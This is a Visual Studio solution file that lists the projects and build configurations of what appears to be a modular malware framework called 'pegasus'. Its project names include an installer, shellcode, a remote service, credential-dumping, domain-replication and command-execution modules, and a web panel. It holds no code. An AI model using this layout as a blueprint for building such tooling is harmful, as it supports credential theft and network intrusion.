
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 2013
VisualStudioVersion = 12.0.31101.0
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "InstallerExe", "InstallerExe\inst.vcxproj", "{4C0E42C0-F675-4186-A609-E302E79FE537}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "RemoteServiceExe", "RemoteServiceExe\rse.vcxproj", "{4C0E42C0-F675-4186-A609-E304E76FE437}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "LZ4_pack", "LZ4_pack\LZ4_pack.vcxproj", "{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "shellcode", "Shellcode\Shellcode.vcxproj", "{AA257921-F128-41DF-BA66-0CAA5475A932}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "InstallDispatcherDll", "InstallDispatcherDll\idd.vcxproj", "{4C3E42C0-F475-4586-A679-E384E79FE037}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "DispatcherDlls", "DispatcherDlls", "{DE6084E8-ACD0-4E45-A177-5FE0F0DCE379}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "tools", "tools", "{A87A9AD9-AA03-4E1E-89E2-203617F802C2}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "WorkDispatcherDll", "WorkDispatcherDll\wdd.vcxproj", "{4C3E43C0-F435-4546-A669-E384779F8037}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Modules", "Modules", "{993005BB-6ECE-44C3-B94F-5DF80CE7F5E6}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "mod_DomainReplication", "mod_DomainReplication\mod_DomainReplication.vcxproj", "{8B526CB2-4D7F-4051-8049-93BCFEAFB593}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "mod_LogonPasswords", "mod_LogonPasswords\mod_LogonPasswords.vcxproj", "{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "mod_NetworkConnectivity", "mod_NetworkConnectivity\mod_NetworkConnectivity.vcxproj", "{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}"
EndProject
Project("{A0786B88-2ADB-4C21-ABE8-AA2D79766269}") = "pegasus-web", "WEB\pegasus-web.phpproj", "{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "mod_CmdExec", "mod_CmdExec\mod_CmdExec.vcxproj", "{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Core", "Core", "{7AFE3E1A-A38B-4B52-A7E1-AED9D7005798}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "mod_KBRI", "mod_KBRI\mod_KBRI.vcxproj", "{E594B27A-732B-4A86-A8F8-A40D731675FD}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "mod_KBRI_hd", "mod_KBRI_hd\mod_KBRI_hd.vcxproj", "{5F482402-07EE-49C8-80FB-F944FE8379DF}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "spec", "spec", "{BCD52D8B-CAF0-41D6-9104-9B6FAB54A787}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Debug|Mixed Platforms = Debug|Mixed Platforms
		Debug|Win32 = Debug|Win32
		Debug|x32 = Debug|x32
		Debug|x64 = Debug|x64
		Release|Any CPU = Release|Any CPU
		Release|Mixed Platforms = Release|Mixed Platforms
		Release|Win32 = Release|Win32
		Release|x32 = Release|x32
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Debug|Win32.ActiveCfg = Debug|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Debug|Win32.Build.0 = Debug|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Debug|x32.ActiveCfg = Debug|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Debug|x32.Build.0 = Debug|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Debug|x64.ActiveCfg = Debug|x64
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Debug|x64.Build.0 = Debug|x64
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Release|Any CPU.ActiveCfg = Release|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Release|Mixed Platforms.Build.0 = Release|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Release|Win32.ActiveCfg = Release|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Release|Win32.Build.0 = Release|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Release|x32.ActiveCfg = Release|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Release|x32.Build.0 = Release|Win32
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Release|x64.ActiveCfg = Release|x64
		{4C0E42C0-F675-4186-A609-E302E79FE537}.Release|x64.Build.0 = Release|x64
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Debug|Win32.ActiveCfg = Debug|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Debug|Win32.Build.0 = Debug|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Debug|x32.ActiveCfg = Debug|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Debug|x32.Build.0 = Debug|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Debug|x64.ActiveCfg = Debug|x64
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Debug|x64.Build.0 = Debug|x64
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Release|Any CPU.ActiveCfg = Release|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Release|Mixed Platforms.Build.0 = Release|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Release|Win32.ActiveCfg = Release|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Release|Win32.Build.0 = Release|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Release|x32.ActiveCfg = Release|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Release|x32.Build.0 = Release|Win32
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Release|x64.ActiveCfg = Release|x64
		{4C0E42C0-F675-4186-A609-E304E76FE437}.Release|x64.Build.0 = Release|x64
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Debug|Win32.ActiveCfg = Debug|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Debug|Win32.Build.0 = Debug|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Debug|x32.ActiveCfg = Debug|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Debug|x64.ActiveCfg = Debug|x64
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Release|Any CPU.ActiveCfg = Release|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Release|Mixed Platforms.Build.0 = Release|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Release|Win32.ActiveCfg = Release|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Release|Win32.Build.0 = Release|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Release|x32.ActiveCfg = Release|Win32
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7}.Release|x64.ActiveCfg = Release|x64
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Debug|Win32.ActiveCfg = Debug|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Debug|Win32.Build.0 = Debug|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Debug|x32.ActiveCfg = Release|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Debug|x32.Build.0 = Release|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Debug|x64.ActiveCfg = Release|x64
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Debug|x64.Build.0 = Release|x64
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Release|Any CPU.ActiveCfg = Release|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Release|Mixed Platforms.Build.0 = Release|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Release|Win32.ActiveCfg = Release|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Release|Win32.Build.0 = Release|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Release|x32.ActiveCfg = Release|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Release|x32.Build.0 = Release|Win32
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Release|x64.ActiveCfg = Release|x64
		{AA257921-F128-41DF-BA66-0CAA5475A932}.Release|x64.Build.0 = Release|x64
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Debug|Win32.ActiveCfg = Debug|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Debug|Win32.Build.0 = Debug|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Debug|x32.ActiveCfg = Debug|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Debug|x32.Build.0 = Debug|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Debug|x64.ActiveCfg = Debug|x64
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Debug|x64.Build.0 = Debug|x64
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Release|Any CPU.ActiveCfg = Release|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Release|Mixed Platforms.Build.0 = Release|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Release|Win32.ActiveCfg = Release|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Release|Win32.Build.0 = Release|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Release|x32.ActiveCfg = Release|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Release|x32.Build.0 = Release|Win32
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Release|x64.ActiveCfg = Release|x64
		{4C3E42C0-F475-4586-A679-E384E79FE037}.Release|x64.Build.0 = Release|x64
		{4C3E43C0-F435-4546-A669-E384779F8037}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Debug|Win32.ActiveCfg = Debug|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Debug|Win32.Build.0 = Debug|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Debug|x32.ActiveCfg = Debug|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Debug|x32.Build.0 = Debug|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Debug|x64.ActiveCfg = Debug|x64
		{4C3E43C0-F435-4546-A669-E384779F8037}.Debug|x64.Build.0 = Debug|x64
		{4C3E43C0-F435-4546-A669-E384779F8037}.Release|Any CPU.ActiveCfg = Release|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Release|Mixed Platforms.Build.0 = Release|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Release|Win32.ActiveCfg = Release|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Release|Win32.Build.0 = Release|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Release|x32.ActiveCfg = Release|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Release|x32.Build.0 = Release|Win32
		{4C3E43C0-F435-4546-A669-E384779F8037}.Release|x64.ActiveCfg = Release|x64
		{4C3E43C0-F435-4546-A669-E384779F8037}.Release|x64.Build.0 = Release|x64
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Debug|Win32.ActiveCfg = Debug|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Debug|Win32.Build.0 = Debug|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Debug|x32.ActiveCfg = Debug|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Debug|x64.ActiveCfg = Debug|x64
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Debug|x64.Build.0 = Debug|x64
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Release|Any CPU.ActiveCfg = Release|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Release|Mixed Platforms.Build.0 = Release|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Release|Win32.ActiveCfg = Release|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Release|Win32.Build.0 = Release|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Release|x32.ActiveCfg = Release|Win32
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Release|x64.ActiveCfg = Release|x64
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593}.Release|x64.Build.0 = Release|x64
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Debug|Win32.ActiveCfg = Debug|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Debug|Win32.Build.0 = Debug|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Debug|x32.ActiveCfg = Debug|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Debug|x64.ActiveCfg = Debug|x64
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Debug|x64.Build.0 = Debug|x64
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Release|Any CPU.ActiveCfg = Release|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Release|Mixed Platforms.Build.0 = Release|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Release|Win32.ActiveCfg = Release|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Release|Win32.Build.0 = Release|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Release|x32.ActiveCfg = Release|Win32
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Release|x64.ActiveCfg = Release|x64
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8}.Release|x64.Build.0 = Release|x64
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Debug|Win32.ActiveCfg = Debug|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Debug|Win32.Build.0 = Debug|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Debug|x32.ActiveCfg = Debug|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Debug|x64.ActiveCfg = Debug|x64
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Debug|x64.Build.0 = Debug|x64
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Release|Any CPU.ActiveCfg = Release|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Release|Mixed Platforms.Build.0 = Release|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Release|Win32.ActiveCfg = Release|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Release|Win32.Build.0 = Release|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Release|x32.ActiveCfg = Release|Win32
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Release|x64.ActiveCfg = Release|x64
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF}.Release|x64.Build.0 = Release|x64
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Debug|Mixed Platforms.ActiveCfg = Debug|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Debug|Mixed Platforms.Build.0 = Debug|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Debug|Win32.ActiveCfg = Debug|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Debug|x32.ActiveCfg = Debug|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Debug|x32.Build.0 = Debug|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Debug|x64.ActiveCfg = Debug|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Release|Any CPU.Build.0 = Release|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Release|Mixed Platforms.ActiveCfg = Release|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Release|Mixed Platforms.Build.0 = Release|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Release|Win32.ActiveCfg = Release|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Release|x32.ActiveCfg = Release|Any CPU
		{F4CBA7E9-6D7B-4D03-BB44-5D201148DD94}.Release|x64.ActiveCfg = Release|Any CPU
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Debug|Win32.ActiveCfg = Debug|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Debug|Win32.Build.0 = Debug|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Debug|x32.ActiveCfg = Debug|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Debug|x64.ActiveCfg = Debug|x64
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Debug|x64.Build.0 = Debug|x64
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Release|Any CPU.ActiveCfg = Release|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Release|Mixed Platforms.Build.0 = Release|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Release|Win32.ActiveCfg = Release|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Release|Win32.Build.0 = Release|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Release|x32.ActiveCfg = Release|Win32
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Release|x64.ActiveCfg = Release|x64
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D}.Release|x64.Build.0 = Release|x64
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Debug|Win32.ActiveCfg = Debug|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Debug|Win32.Build.0 = Debug|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Debug|x32.ActiveCfg = Debug|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Debug|x64.ActiveCfg = Debug|x64
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Debug|x64.Build.0 = Debug|x64
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Release|Any CPU.ActiveCfg = Release|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Release|Mixed Platforms.Build.0 = Release|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Release|Win32.ActiveCfg = Release|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Release|Win32.Build.0 = Release|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Release|x32.ActiveCfg = Release|Win32
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Release|x64.ActiveCfg = Release|x64
		{E594B27A-732B-4A86-A8F8-A40D731675FD}.Release|x64.Build.0 = Release|x64
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Debug|Any CPU.ActiveCfg = Debug|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Debug|Mixed Platforms.ActiveCfg = Debug|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Debug|Mixed Platforms.Build.0 = Debug|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Debug|Win32.ActiveCfg = Debug|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Debug|Win32.Build.0 = Debug|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Debug|x32.ActiveCfg = Debug|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Debug|x64.ActiveCfg = Debug|x64
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Debug|x64.Build.0 = Debug|x64
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Release|Any CPU.ActiveCfg = Release|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Release|Mixed Platforms.ActiveCfg = Release|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Release|Mixed Platforms.Build.0 = Release|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Release|Win32.ActiveCfg = Release|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Release|Win32.Build.0 = Release|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Release|x32.ActiveCfg = Release|Win32
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Release|x64.ActiveCfg = Release|x64
		{5F482402-07EE-49C8-80FB-F944FE8379DF}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(NestedProjects) = preSolution
		{4C0E42C0-F675-4186-A609-E304E76FE437} = {7AFE3E1A-A38B-4B52-A7E1-AED9D7005798}
		{B1B83F66-2537-44B2-961E-DB8FCB36AEC7} = {A87A9AD9-AA03-4E1E-89E2-203617F802C2}
		{AA257921-F128-41DF-BA66-0CAA5475A932} = {7AFE3E1A-A38B-4B52-A7E1-AED9D7005798}
		{4C3E42C0-F475-4586-A679-E384E79FE037} = {DE6084E8-ACD0-4E45-A177-5FE0F0DCE379}
		{DE6084E8-ACD0-4E45-A177-5FE0F0DCE379} = {7AFE3E1A-A38B-4B52-A7E1-AED9D7005798}
		{4C3E43C0-F435-4546-A669-E384779F8037} = {DE6084E8-ACD0-4E45-A177-5FE0F0DCE379}
		{8B526CB2-4D7F-4051-8049-93BCFEAFB593} = {993005BB-6ECE-44C3-B94F-5DF80CE7F5E6}
		{8901E0C6-1DC7-48CD-89CC-F75BAA7240B8} = {993005BB-6ECE-44C3-B94F-5DF80CE7F5E6}
		{ED1E8541-2CCB-4766-BBB2-E0B479C97ABF} = {993005BB-6ECE-44C3-B94F-5DF80CE7F5E6}
		{692790A0-F4EF-4A1F-8975-D7D6F86E0F6D} = {993005BB-6ECE-44C3-B94F-5DF80CE7F5E6}
		{E594B27A-732B-4A86-A8F8-A40D731675FD} = {BCD52D8B-CAF0-41D6-9104-9B6FAB54A787}
		{5F482402-07EE-49C8-80FB-F944FE8379DF} = {BCD52D8B-CAF0-41D6-9104-9B6FAB54A787}
		{BCD52D8B-CAF0-41D6-9104-9B6FAB54A787} = {993005BB-6ECE-44C3-B94F-5DF80CE7F5E6}
	EndGlobalSection
EndGlobal
